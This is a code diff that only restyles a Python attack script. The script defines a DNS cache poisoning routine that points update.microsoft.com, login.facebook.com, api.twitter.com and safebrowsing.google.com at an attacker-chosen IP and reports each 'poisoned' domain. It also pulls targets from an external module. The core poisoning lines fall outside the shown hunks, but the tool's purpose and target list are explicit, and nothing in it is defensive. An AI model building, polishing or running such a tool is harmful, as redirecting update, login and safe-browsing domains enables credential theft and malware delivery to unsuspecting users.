@@ -1,10 +1,15 @@
-import os, random
+import os
+import random
+
 from memory_engine import get_top_targets
+
 
 def poison_dns_cache(ip):
     domains = [
-        "update.microsoft.com", "login.facebook.com",
-        "api.twitter.com", "safebrowsing.google.com"
+        "update.microsoft.com",
+        "login.facebook.com",
+        "api.twitter.com",
+        "safebrowsing.google.com",
     ]
     for d in domains:
         try:
@@ -14,6 +19,7 @@ def poison_dns_cache(ip):
             print(f"[+] Poisoned cache for {d} -> {ip}")
         except Exception as e:
             print(f"[!] Failed poison: {d} - {e}")
+
 
 if __name__ == "__main__":
     top = get_top_targets()
